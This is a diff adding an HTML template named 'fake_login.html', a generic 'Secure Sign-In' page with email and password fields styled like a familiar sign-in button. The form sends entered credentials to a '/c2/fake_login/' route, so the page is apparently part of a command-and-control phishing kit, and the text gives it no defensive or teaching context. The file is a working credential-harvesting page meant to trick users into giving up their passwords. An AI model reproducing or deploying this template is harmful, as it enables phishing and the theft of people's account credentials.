@@ -1,0 +1,24 @@
+
+<!-- templates/fake_login.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Sign-In</title>
+    <style>
+        body { font-family: Arial; background: #f4f4f4; padding: 50px; }
+        .login-box { background: #fff; padding: 20px; width: 300px; margin: auto; border: 1px solid #ccc; }
+        input { width: 100%; margin: 10px 0; padding: 10px; }
+        button { padding: 10px; background: #4285F4; color: white; border: none; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Sign in to continue</h2>
+        <form method="POST" action="/c2/fake_login/">
+            <input type="text" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
